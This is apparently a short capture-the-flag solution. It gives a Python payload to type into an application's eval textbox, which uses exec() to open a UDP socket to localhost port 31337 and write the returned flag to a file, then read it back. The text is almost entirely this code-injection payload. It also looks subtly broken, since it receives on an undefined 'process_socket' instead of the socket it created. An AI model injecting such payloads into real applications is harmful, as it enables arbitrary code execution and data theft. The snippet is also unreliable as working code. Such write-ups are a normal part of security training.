# Solution

Type this in eval textbox:

exec("""import socket as s;p=s.socket(s.AF_INET, s.SOCK_DGRAM);p.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1);p.bind(("localhost", 0));p.sendto(b"", ("localhost", 31337));open("file_name", "wb").write((process_socket.recvfrom(1024))[0])""")   - write flag to "file_name"

open("file_name")   - read flag from "file_name"
